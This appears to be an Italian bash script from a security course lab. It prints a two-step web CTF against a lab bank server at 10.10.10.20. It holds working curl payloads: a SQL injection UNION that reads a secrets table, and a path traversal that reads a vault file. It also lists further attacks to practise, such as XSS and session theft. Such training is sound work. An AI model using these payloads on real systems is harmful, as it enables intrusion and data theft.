#!/usr/bin/env bash
# Lezione 18 · lato Kali · mini CTF web (ripasso OWASP Top 10). Sola lettura.
set -uo pipefail
TARGET_IP="10.10.10.20"
echo "== Lezione 18 · Ripasso OWASP Top 10 e mini CTF web =="
echo
curl -s -o /dev/null -m 4 "http://${TARGET_IP}:8080/" && echo "[OK] La Banca risponde su :8080." || echo "[--] Banca giu': sul bersaglio  lab 12  e  lab 18 ."
cat <<'MSG'

------------------------------------------------------------
 MINI CTF · "Svuota il caveau" (catena di due tecniche)
------------------------------------------------------------
 Metti in fila quello che hai imparato nel blocco web.

 [ ] Sfida 1 · trova il caveau con la SQL injection           (+30)
     Usa la ricerca vulnerabile e la UNION per leggere la tabella segreti:
     curl "http://10.10.10.20:8080/cerca?conto=' UNION SELECT chiave,valore,'x' FROM segreti -- "
     Leggi la prima flag e ANNOTA il percorso del caveau che compare.

 [ ] Sfida 2 · apri il caveau con il path traversal (LFI)     (+40)
     Usa il percorso trovato nella pagina documenti:
     curl "http://10.10.10.20:8080/documenti?file=../segreti/vault_XXXX.txt"
     (sostituisci con il nome file che hai letto nella Sfida 1)

 RIPASSO: rifai in autonomia i colpi del blocco (login bypass, dump con sqlmap,
 XSS, furto di sessione, brute force, upload) e segna il punteggio totale.
------------------------------------------------------------
MSG
